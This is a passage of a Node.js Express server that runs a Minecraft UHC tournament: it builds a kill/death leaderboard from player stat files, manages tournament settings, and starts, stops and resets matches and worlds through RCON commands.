    res.status(500).json({ error: err.message });
  }
});

// 4. /api/stats
app.get('/api/stats', (req, res) => {
  try {
    if (!fs.existsSync(STATS_DIR)) {
      console.log(`[Parser] Stats folder not found at ${STATS_DIR}. Returning mock UHC leaderboard.`);
      return res.json({ source: 'mock', data: MOCK_LEADERBOARD });
    }

    const files = fs.readdirSync(STATS_DIR).filter((file) => file.endsWith('.json'));

    if (files.length === 0) {
      console.log('[Parser] Stats folder empty. Returning mock UHC leaderboard.');
      return res.json({ source: 'mock', data: MOCK_LEADERBOARD });
    }

    const cacheMap = loadUserCache();
    const statsList = [];

    files.forEach((filename) => {
      try {
        const filepath = path.join(STATS_DIR, filename);
        const uuid = filename.replace('.json', '');
        const cleanUuid = uuid.toLowerCase().replace(/-/g, '');

        const content = fs.readFileSync(filepath, 'utf8');
        const json = JSON.parse(content);

        // Fetch statistics compatible with Paper/Spigot 1.8.8 flat format & newer nested format
        let kills = 0;
        let deaths = 0;

        // 1.8 flat format keys
        if (json['stat.playerKills'] !== undefined) kills = json['stat.playerKills'];
        else if (json['stat.killEntity.Player'] !== undefined) kills = json['stat.killEntity.Player'];

        if (json['stat.deaths'] !== undefined) deaths = json['stat.deaths'];

        // 1.15+ nested format support (just in case)
        if (json.stats) {
          const custom = json.stats['minecraft:custom'];
          if (custom) {
            if (custom['minecraft:player_kills'] !== undefined) kills = custom['minecraft:player_kills'];
            if (custom['minecraft:deaths'] !== undefined) deaths = custom['minecraft:deaths'];
          }
        }

        // Map UUID to Username via usercache
        const username = cacheMap.get(cleanUuid) || uuid.substring(0, 8);

        // Determine UHC-specific live tournament status
        let status = 'Alive';
        if (uhcState.placements && uhcState.placements[username.toLowerCase()] !== undefined) {
          const placementRank = uhcState.placements[username.toLowerCase()];
          status = placementRank === 1 ? 'Ganador' : `Top ${placementRank}`;
        } else if (uhcState.active) {
          const isAliveInUhc = uhcState.aliveParticipants && uhcState.aliveParticipants.some(p => p.toLowerCase() === username.toLowerCase());
          status = isAliveInUhc ? 'Alive' : 'Eliminated';
        } else {
          status = deaths > 0 ? 'Eliminated' : 'Alive';
        }

        statsList.push({
          uuid,
          name: username,
          kills,
          deaths,
          status
        });
      } catch (fileErr) {
        console.error(`[Parser] Error reading stats file ${filename}:`, fileErr.message);
      }
    });

    // Sort leaderboard by: Winner first, then Alive players (by kills), then Tops (by rank order), then General Eliminated
    statsList.sort((a, b) => {
      const getPriority = (status) => {
        if (status === 'Ganador') return 0;
        if (status === 'Alive') return 1;
        if (status.startsWith('Top ')) {
          const num = parseInt(status.substring(4), 10);
          return 2 + num; // smaller top rank goes first (e.g. Top 2 before Top 3)
        }
        if (status === 'Eliminated') return 1000;
        return 2000;
      };

      const priorityA = getPriority(a.status);
      const priorityB = getPriority(b.status);

      if (priorityA !== priorityB) return priorityA - priorityB;
      if (b.kills !== a.kills) return b.kills - a.kills;
      return a.name.localeCompare(b.name);
    });

    // Add positions
    const sortedLeaderboard = statsList.map((entry, index) => ({
      rank: index + 1,
      ...entry
    }));

    res.json({ source: 'live', data: sortedLeaderboard });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// --- UHC API ENDPOINTS ---

// 5. GET /api/uhc/status
app.get('/api/uhc/status', (req, res) => {
  res.json({
    active: uhcState.active,
    state: uhcState.state,
    startTime: uhcState.startTime,
    graceTime: uhcState.graceTime,
    finalHealTime: uhcState.finalHealTime,
    worldSeed: uhcState.worldSeed,
    startBorderSize: uhcState.startBorderSize,
    playersPerBorder: uhcState.playersPerBorder,
    calcBorderByDensity: uhcState.calcBorderByDensity,
    eventName: uhcState.eventName,
    serverIp: uhcState.serverIp,
    scenarios: uhcState.scenarios,
    zone1Border: uhcState.zone1Border,
    zone1Time: uhcState.zone1Time,
    zone2Border: uhcState.zone2Border,
    zone2Time: uhcState.zone2Time,
    zone3Border: uhcState.zone3Border,
    zone3Time: uhcState.zone3Time,
    currentBorderSize: uhcState.currentBorderSize,
    elapsedSeconds: uhcState.elapsedSeconds
  });
});

// GET /api/uhc/history
app.get('/api/uhc/history', (req, res) => {
  try {
    const historyFile = UHC_HISTORY_FILE;
    let history = [];
    if (fs.existsSync(historyFile)) {
      history = JSON.parse(fs.readFileSync(historyFile, 'utf8'));
    }
    res.json(history);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 6. POST /api/uhc/config
app.post('/api/uhc/config', (req, res) => {
  try {
    const {
      graceTime,
      finalHealTime,
      worldSeed,
      startBorderSize,
      playersPerBorder,
      calcBorderByDensity,
      eventName,
      serverIp,
      scenarios,
      zone1Border,
      zone1Time,
      zone2Border,
      zone2Time,
      zone3Border,
      zone3Time
    } = req.body;

    if (uhcState.active) {
      return res.status(400).json({ error: 'No se puede modificar la configuración mientras hay un UHC activo.' });
    }

    if (graceTime !== undefined) uhcState.graceTime = parseInt(graceTime, 10);
    if (finalHealTime !== undefined) uhcState.finalHealTime = parseInt(finalHealTime, 10);
    if (worldSeed !== undefined) uhcState.worldSeed = worldSeed.toString().trim();
    if (startBorderSize !== undefined) uhcState.startBorderSize = parseInt(startBorderSize, 10);
    if (playersPerBorder !== undefined) uhcState.playersPerBorder = parseInt(playersPerBorder, 10);
    if (calcBorderByDensity !== undefined) uhcState.calcBorderByDensity = !!calcBorderByDensity;
    if (eventName !== undefined) uhcState.eventName = eventName.toString().trim();
    if (serverIp !== undefined) uhcState.serverIp = serverIp.toString().trim();
    if (scenarios !== undefined) uhcState.scenarios = { ...uhcState.scenarios, ...scenarios };
    
    if (zone1Border !== undefined) uhcState.zone1Border = parseInt(zone1Border, 10);
    if (zone1Time !== undefined) uhcState.zone1Time = parseInt(zone1Time, 10);
    
    if (zone2Border !== undefined) uhcState.zone2Border = parseInt(zone2Border, 10);
    if (zone2Time !== undefined) uhcState.zone2Time = parseInt(zone2Time, 10);
    
    if (zone3Border !== undefined) uhcState.zone3Border = parseInt(zone3Border, 10);
    if (zone3Time !== undefined) uhcState.zone3Time = parseInt(zone3Time, 10);

    saveUhcConfig();

    // Sincronizar inmediatamente el Scoreboard en el plugin para reflejar IP/Evento en el lobby
    if (rconClient.connected) {
      const serverIpClean = (uhcState.serverIp || 'play.rankit.net').replace(/ /g, '_');
      const eventNameClean = (uhcState.eventName || 'UHC_Evento').replace(/ /g, '_');
      executeRconCommand(`uhcscenario scoreboard ${serverIpClean} ${eventNameClean} Espera 0 2000 0`).catch(() => {});
    }

    res.json({ success: true, config: uhcState });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 7. POST /api/uhc/start
app.post('/api/uhc/start', async (req, res) => {
  try {
    if (uhcState.active) {
      return res.status(400).json({ error: 'El torneo UHC ya está activo.' });
    }
    if (!rconClient.connected) {
      return res.status(503).json({ error: 'Consola RCON no conectada. No se puede iniciar el UHC.' });
    }

    await startUhcGame();
    res.json({ success: true, message: '¡Torneo UHC iniciado exitosamente!' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 8. POST /api/uhc/stop
app.post('/api/uhc/stop', async (req, res) => {
  try {
    if (!uhcState.active) {
      return res.status(400).json({ error: 'No hay ningún torneo UHC activo.' });
    }

    console.log('[UHC Engine] Stopping and resetting UHC...');
    uhcState.active = false;
    uhcState.state = 'idle';
    uhcState.elapsedSeconds = 0;
    uhcState.participants = [];
    uhcState.aliveParticipants = [];
    uhcState.placements = {};
    uhcState.initialStats = {};
    
    if (uhcState.timerInterval) {
      clearInterval(uhcState.timerInterval);
      uhcState.timerInterval = null;
    }

    // Reset RCON settings
    await executeRconCommand('worldborder set 60000');
    await executeRconCommand('gamerule pvp true');
    await executeRconCommand('gamerule naturalRegeneration true');
    await executeRconCommand('effect @a clear');
    await executeRconCommand('clear @a');
    
    // Disable custom scenarios in Java Spigot plugin
    await executeRconCommand('uhcscenario active false');
    await executeRconCommand('uhcscenario cutclean false');
    await executeRconCommand('uhcscenario noclean false');
    await executeRconCommand('uhcscenario timebomb false');
    
    // Clear custom scenarios
    if (uhcState.scenarios.doubleHealth) {
      await executeRconCommand('effect @a clear');
    }

    await executeRconCommand('title @a title {"text":"UHC DETENIDO","color":"red"}');
    await executeRconCommand('title @a subtitle {"text":"El administrador detuvo el juego","color":"yellow"}');
    await executeRconCommand('say ¡El torneo UHC ha sido cancelado y reiniciado por el administrador!');

    // Rebuild and teleport to lobby
    await generateLobbyStructure();

    res.json({ success: true, message: '¡Torneo UHC detenido y reiniciado exitosamente!' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 9. POST /api/lobby/regenerate
app.post('/api/lobby/regenerate', async (req, res) => {
  try {
    if (!rconClient.connected) {
      return res.status(503).json({ error: 'La consola RCON no está conectada. No se puede regenerar el lobby.' });
    }
    await generateLobbyStructure();
    res.json({ success: true, message: '¡Lobby del torneo regenerado y construído exitosamente!' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 10. POST /api/world/regenerate
app.post('/api/world/regenerate', async (req, res) => {
  try {
    const { seed } = req.body;
    
    if (uhcState.active) {
      return res.status(400).json({ error: 'No se puede regenerar el mundo mientras hay un UHC activo.' });
    }
    
    if (!rconClient.connected) {
      return res.status(503).json({ error: 'La consola RCON no está conectada. No se puede regenerar el mundo.' });
    }
    
    const newSeed = (seed !== undefined) ? seed.toString().trim() : '';
    
    // Update server.properties
    const propPath = path.join(__dirname, 'mc-data', 'server.properties');
    if (fs.existsSync(propPath)) {
      let content = fs.readFileSync(propPath, 'utf8');
      if (content.includes('level-seed=')) {
        content = content.replace(/level-seed=.*/, `level-seed=${newSeed}`);
      } else {
        content += `\nlevel-seed=${newSeed}\n`;
      }
      fs.writeFileSync(propPath, content, 'utf8');
    }
    
    uhcState.worldSeed = newSeed;
    saveUhcConfig();
    
    console.log(`[World Regenerator] Seed updated to "${newSeed}". Stopping Minecraft server to release file handles...`);
    
    // Trigger RCON /stop. This triggers container restart via Docker compose
    await rconClient.send('stop').catch((err) => {
      console.warn('[World Regenerator] Failed to send stop command, server might be already stopping:', err.message);
    });
    
    // Defer folder deletion and restart
    setTimeout(async () => {
      console.log('[World Regenerator] Starting deletion of world folders...');
      const folders = ['world', 'world_nether', 'world_the_end'];
      for (const folder of folders) {
        const folderPath = path.join(__dirname, 'mc-data', folder);
        if (fs.existsSync(folderPath)) {
          let success = false;
          for (let attempt = 1; attempt <= 6; attempt++) {
            try {
              fs.rmSync(folderPath, { recursive: true, force: true });
              success = true;
              console.log(`[World Regenerator] Successfully deleted directory: ${folder} on attempt ${attempt}`);
              break;
            } catch (err) {
              console.warn(`[World Regenerator] Attempt ${attempt} to delete ${folder} failed: ${err.message}`);
              await new Promise(r => setTimeout(r, 1000));
            }
          }
          if (!success) {
            console.error(`[World Regenerator] Critical: Failed to delete world directory: ${folder}`);
          }
        }
      }
      console.log('[World Regenerator] Cleanup complete. The server is restarting now.');
    }, 3000);
    
    res.json({ success: true, message: 'La regeneración del mundo se ha iniciado. El servidor se detendrá, se eliminarán los mundos y se regenerarán con la semilla especificada.' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Serve frontend assets statically
app.use(express.static(path.join(__dirname, 'public')));

// Fallback to index.html for general routes
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start Express Listener
app.listen(PORT, () => {
  console.log(`==================================================`);
  console.log(` UHC TOURNAMENT CONTROLLER RUNNING ON PORT ${PORT} `);
  console.log(`==================================================`);
});
